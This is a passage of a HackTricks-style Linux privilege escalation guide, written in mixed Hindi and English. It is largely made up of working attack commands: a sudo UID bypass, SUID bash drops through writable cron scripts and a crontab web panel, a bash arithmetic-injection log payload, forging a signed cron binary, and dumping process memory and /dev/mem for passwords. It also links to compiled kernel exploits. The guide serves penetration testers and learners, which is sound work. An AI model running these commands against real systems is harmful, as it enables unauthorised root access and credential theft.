# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में जानकारी इकट्ठा करना शुरू करते हैं
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास **have write permissions on any folder inside the `PATH`** variable हैं, तो आप कुछ libraries या binaries hijack कर सकते हैं:
```bash
echo $PATH
```
### Env info

क्या environment variables में कोई दिलचस्प जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

कर्नेल संस्करण की जाँच करें और देखें क्या कोई ऐसा exploit है जिसे escalate privileges के लिए इस्तेमाल किया जा सके
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel सूची और कुछ पहले से बनी हुई **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी vulnerable kernel संस्करण निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले उपकरण:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim में execute करें, केवल exploits को kernel 2.x के लिए जांचता है)

हमेशा **Google में kernel version खोजें**, हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित होंगे कि यह exploit वैध है।

अतिरिक्त kernel exploitation तकनीकें:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन कमजोर sudo संस्करणों के आधार पर जो दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo संस्करण vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के 1.9.17p1 से पहले के वर्शन (**1.9.14 - 1.9.17 < 1.9.17p1**) अनप्रिविलेज्ड लोकल उपयोगकर्ताओं को sudo `--chroot` विकल्प के माध्यम से अपनी विशेषाधिकारों को root में बढ़ाने की अनुमति देते हैं जब `/etc/nsswitch.conf` फ़ाइल किसी उपयोगकर्ता-नियंत्रित डायरेक्टरी से उपयोग की जाती है।

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन असफल

जाँचें **smasher2 box of HTB** इस बात के **उदाहरण** के लिए कि यह vuln कैसे exploited किया जा सकता है
```bash
dmesg 2>/dev/null | grep "signature"
```
### और system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित रक्षा उपायों को सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप docker container के अंदर हैं तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:


{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँचें **what is mounted and unmounted**, कहाँ और क्यों। यदि कुछ भी unmounted है तो आप उसे mount करने की कोशिश कर सकते हैं और निजी जानकारी की जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, जाँच करें कि **any compiler is installed**। यह उपयोगी है अगर आपको किसी kernel exploit का उपयोग करना हो क्योंकि यह अनुशंसा की जाती है कि इसे उसी machine पर compile किया जाए जहाँ आप इसका उपयोग करने वाले हैं (या किसी समान machine पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Vulnerable Software Installed

इंस्टॉल किए गए पैकेज और सेवाओं के **संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसे escalating privileges के लिए exploit किया जा सके…\
अनुशंसित है कि अधिक संदिग्ध रूप से इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअली जाँचें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH एक्सेस है तो आप मशीन में इंस्टॉल किए गए पुराने और कमजोर सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी जानकारी दिखाएंगे जो अधिकांशतः उपयोगहीन होगी, इसलिए OpenVAS या इसी तरह के कुछ applications की सिफारिश की जाती है जो जाँच करें कि क्या कोई इंस्टॉल किया गया software version ज्ञात exploits के लिए vulnerable है_

## Processes

देखें कि कौन से **what processes** चलाए जा रहे हैं और जाँच करें कि कोई process **more privileges than it should** तो नहीं रखता (शायद कोई tomcat root द्वारा चल रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा यह चेक करें कि कोई [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
साथ ही **check your privileges over the processes binaries**, शायद आप किसी को overwrite कर सकें।

### प्रोसेस मॉनिटरिंग

आप [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग processes मॉनिटर करने के लिए कर सकते हैं। यह उन vulnerable processes की पहचान करने में बहुत उपयोगी हो सकता है जो अक्सर execute होते हैं या जब किसी set of requirements पूरे होते हैं।

### प्रोसेस मेमोरी

कुछ server services memory के अंदर clear text में **credentials** save कर देती हैं।\
सामान्यतः अन्य users के processes की memory पढ़ने के लिए आपको **root privileges** चाहिए होते हैं, इसलिए यह आम तौर पर तब ज्यादा उपयोगी होता है जब आप पहले से root हों और और भी credentials खोजना चाहें।\
हालाँकि, याद रखें कि आप एक regular user के रूप में उन processes की memory पढ़ सकते हैं जिनके owner आप हैं।

> [!WARNING]
> ध्यान दें कि आजकल ज़्यादातर machines **ptrace को default में allow नहीं करतीं** जिसका मतलब है कि आप अपने unprivileged user के अन्य processes को dump नहीं कर पाएँगे।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की accessibility को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

यदि आपके पास किसी FTP service की memory तक access है (उदाहरण के लिए), तो आप Heap प्राप्त करके उसके अंदर के **credentials** खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

For a given process ID, **maps दिखाते हैं कि memory उस process के virtual address space में किस तरह mapped है**; यह यह भी दिखाता है कि **प्रत्येक mapped region की permissions क्या हैं**। **mem** pseudo file **process की memory को स्वयं expose करता है**। **maps** file से हम जानते हैं कि कौन से **memory regions readable हैं** और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **mem file में seek करके सभी readable regions को एक file में dump करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **physical** memory तक पहुँच प्रदान करता है, न कि virtual memory। kernel की virtual address space को /dev/kmem का उपयोग करके access किया जा सकता है।\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा पढ़ा जा सकता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump Linux के लिए Windows के Sysinternals सूट के क्लासिक ProcDump टूल की पुनर्कल्पना है। इसे प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

process memory को dump करने के लिए आप निम्नलिखित का उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअल रूप से root requirements हटा कर अपने द्वारा owned process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Credentials from Process Memory

#### मैन्युअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शन देखें ताकि process की memory dump करने के विभिन्न तरीके मिल सकें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से और कुछ **well known files** से **clear text credentials** चुराएगा। यह सही ढंग से काम करने के लिए root privileges की आवश्यकता रखता है।

| विशेषता                                           | प्रोसेस नाम         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron जॉब्स

### Crontab UI (alseambusher) running as root – web-आधारित शेड्यूलर privesc

यदि एक वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चल रहा है और केवल loopback से बाइंड है, तो आप इसे SSH local port-forwarding के माध्यम से अभी भी पहुँच सकते हैं और एक privileged job बनाकर privesc कर सकते हैं।

Typical chain
- loopback-only पोर्ट खोजें (e.g., 127.0.0.1:8000) और Basic-Auth realm का पता लगाएँ via `ss -ntlp` / `curl -v localhost:8000`
- ऑपरेशनल artifacts में credentials खोजें:
  - Backups/scripts जो `zip -P <password>` के साथ हों
  - systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` एक्सपोज़ कर रहा हो
- Tunnel और login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएँ (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; एक समर्पित उपयोगकर्ता और न्यूनतम अनुमतियों के साथ सीमित करें
- localhost से बाइंड करें और अतिरिक्त रूप से पहुँच को firewall/VPN के माध्यम से प्रतिबंधित करें; पासवर्ड पुन: उपयोग न करें
- unit files में secrets एम्बेड करने से बचें; secret stores या केवल root के लिए EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें



जांचें कि कोई scheduled job vulnerable है या नहीं। शायद आप root द्वारा execute किए जा रहे किसी script का फायदा उठा सकते हैं (wildcard vuln? क्या आप उन files को modify कर सकते हैं जिनका उपयोग root करता है? symlinks का उपयोग करें? root द्वारा उपयोग किए जाने वाले directory में specific फाइलें बनाएं?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab में root उपयोगकर्ता PATH सेट किए बिना कोई कमांड या स्क्रिप्ट चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\

फिर, आप निम्न का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि कोई script root द्वारा चलाया जाता है और किसी command में “**\***” मौजूद है, तो आप इसे exploit करके अनपेक्षित चीजें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path जैसे** _**/some/path/\***_ **से पहले आता है, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

wildcard exploitation tricks के लिए निम्न पृष्ठ पढ़ें:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash parameter expansion और command substitution को arithmetic evaluation से पहले ((...)), $((...)) और let में करता है। अगर कोई root cron/parser untrusted log fields पढ़कर उन्हें arithmetic context में पास करता है, तो attacker एक command substitution `$(...)` inject कर सकता है जो cron run होने पर root के रूप में execute होगा।

- Why it works: Bash में expansions यह क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion। तो `$(/bin/bash -c 'id > /tmp/pwn')0` जैसा मान पहले substituted होता है (command चल रहा होता है), फिर शेष numeric `0` arithmetic के लिए उपयोग होता है इसलिए script बिना errors के आगे चलता है।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: attacker-controlled text को parsed log में लिखवाएँ ताकि numeric दिखने वाला field एक command substitution रखे और digit पर खत्म हो। सुनिश्चित करें कि आपका command stdout पर कुछ न लिखे (या इसे redirect करें) ताकि arithmetic वैध बने।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप **can modify a cron script** executed by root, तो आप बहुत आसानी से एक shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा चलाया गया script किसी **directory where you have full access** का उपयोग करता है, तो उस folder को delete करके और किसी अन्य की ओर **create a symlink folder to another one** करना उपयोगी हो सकता है जो आपके द्वारा नियंत्रित script को serve करे।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue टीमें कभी-कभी cron-संचालित बाइनरीज़ को "sign" करती हैं by dumping a custom ELF section और vendor string के लिए grep करके उन्हें root के रूप में execute करने से पहले चेक करती हैं। यदि वह binary group-writable है (उदा., `/opt/AV/periodic-checks/monitor` जिसका ownership `root:devs 770` है) और आप signing material को leak कर सकते हैं, तो आप section को forge करके cron task को hijack कर सकते हैं:

1. Use `pspy` to capture the verification flow. In Era, root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया और उसके बाद `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` चलाकर फ़ाइल execute की।
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) और certificate को `.text_sig` में embed करें ताकि grep पास हो जाए:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary जबकि execute bits को preserve करते हुए:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगले cron run का इंतज़ार करें; जैसे ही naive signature check सफल होता है, आपका payload root के रूप में चलेगा।

### Frequent cron jobs

आप processes को monitor कर सकते हैं ताकि उन processes की पहचान हो सके जो हर 1, 2 या 5 मिनट पर execute हो रहे हैं। शायद आप इसका फायदा उठा कर privileges escalate कर सकें।

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आपका भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह शुरू होने वाली हर प्रक्रिया की निगरानी करेगा और उन्हें सूचीबद्ध करेगा)।

### अदृश्य cron jobs

यह संभव है कि एक cronjob बनाया जा सके **टिप्पणी के बाद कैरिज रिटर्न डालकर** (बिना newline character के), और cron job काम करेगा। उदाहरण (कैरिज रिटर्न कैरेक्टर पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

जाँचें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं; अगर कर सकते हैं, तो आप इसे बदलकर ऐसा कर सकते हैं कि यह तब आपका **backdoor** **निष्पादित** करे जब सेवा **प्रारंभ**, **पुनरारंभ** या **बंद** हो (शायद आपको मशीन के reboot होने तक इंतज़ार करना पड़े).\
उदाहरण के लिए, अपनी backdoor को .service फ़ाइल के अंदर इस तरह बनाएं: **`ExecStart=/tmp/script.sh`**

### Writable service binaries

ध्यान रखें कि अगर आपके पास **उन बाइनरीज़ पर लिखने की अनुमति जो services द्वारा चलायी जा रही हैं**, तो आप उन्हें backdoor के लिए बदल सकते हैं ताकि जब services फिर से चलें तो backdoors निष्पादित हो जाएँ।

### systemd PATH - Relative Paths

आप यह देख सकते हैं कि **systemd** द्वारा उपयोग किया गया PATH क्या है:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप पथ के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप **escalate privileges** करने में सक्षम हो सकते हैं। आपको **relative paths being used on service configurations** फ़ाइलों की तलाश करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर जिस पर आप लिख सकते हैं, उसी relative path binary के नाम का एक **executable** बनाएँ, और जब सेवा से vulnerable action (**Start**, **Stop**, **Reload**) को execute करने के लिए कहा जाएगा, तो आपका **backdoor** execute हो जाएगा (unprivileged users आमतौर पर services को start/stop नहीं कर सकते लेकिन जाँच करें कि आप `sudo -l` इस्तेमाल कर सकते हैं या नहीं)।

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** वे systemd unit फ़ाइलें हैं जिनका नाम `**.timer**` पर समाप्त होता है जो `**.service**` फ़ाइलों या घटनाओं को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी timers को enumerate कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं, तो आप इसे systemd.unit की कुछ मौजूद इकाइयों (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> यह यूनिट है जिसे इस timer के समाप्त होते ही सक्रिय किया जाता है। आर्गुमेंट एक यूनिट नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम timer यूनिट के समान होता है, सिवाय suffix के। (ऊपर देखें।) अनुशंसा की जाती है कि सक्रिय की जाने वाली यूनिट का नाम और timer यूनिट का नाम suffix को छोड़कर एक समान हों।

Therefore, to abuse this permission you would need to:

- किसी systemd unit (जैसे `.service`) को ढूंढें जो **executing a writable binary** हो
- किसी systemd unit को ढूंढें जो **executing a relative path** कर रहा हो और आपके पास **writable privileges** हों उस **systemd PATH** पर (ताकि आप उस executable को impersonate कर सकें)

**Learn more about timers with `man systemd.timer`.**

### **Timer को सक्षम करना**

Timer को enable करने के लिए आपको root privileges चाहिए और निम्नलिखित को execute करना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **प्रोसेस कम्युनिकेशन** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग हैं लेकिन सामान्यतः इनका उपयोग यह **सूचित करने के लिए किया जाता है कि यह socket कहाँ सुनने वाला है** (AF_UNIX socket फ़ाइल का path, IPv4/6 और/या सुनने के लिए पोर्ट नंबर, आदि)।
- `Accept`: एक boolean argument लेता है। यदि **true**, तो प्रत्येक आने वाले कनेक्शन के लिए एक **service instance spawned** किया जाता है और केवल connection socket ही उसे पास किया जाता है। यदि **false**, तो सभी listening sockets स्वयं ही **started service unit को पास किए जाते हैं**, और सभी कनेक्शनों के लिए केवल एक service unit spawned होता है। यह मान datagram sockets और FIFOs के लिए अनदेखा कर दिया जाता है जहाँ एक single service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को संभालता है। **Defaults to false**. प्रदर्शन कारणों से, नए daemons केवल इस तरह लिखने की सलाह दी जाती है कि वे `Accept=no` के अनुकूल हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेती हैं, जो कि संबंधित listening **sockets**/FIFOs के बनाए और bound होने से पहले या बाद में **executed** होती हैं। कमांड लाइन का पहला token एक absolute filename होना चाहिए, और उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs को बंद और हटाने से पहले या बाद में **executed** होती हैं।
- `Service`: incoming traffic पर activate करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह setting केवल Accept=no वाले sockets के लिए अनुमति है। इसका डिफ़ॉल्ट वही service होता है जिसका नाम socket के समान होता है (सिर्फ suffix बदला जाता है)। अधिकांश मामलों में इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_ध्यान दें कि सिस्टम को उस socket file configuration का उपयोग कर रहा होना चाहिए अन्यथा backdoor executed नहीं होगा_

### Writable sockets

यदि आप कोई **writable** socket पहचानते हैं (_यहाँ हम config `.socket` files की बात नहीं कर रहे, बल्कि Unix Sockets की बात कर रहे हैं_), तो आप उस socket के साथ communicate कर सकते हैं और संभवतः किसी vulnerability का exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

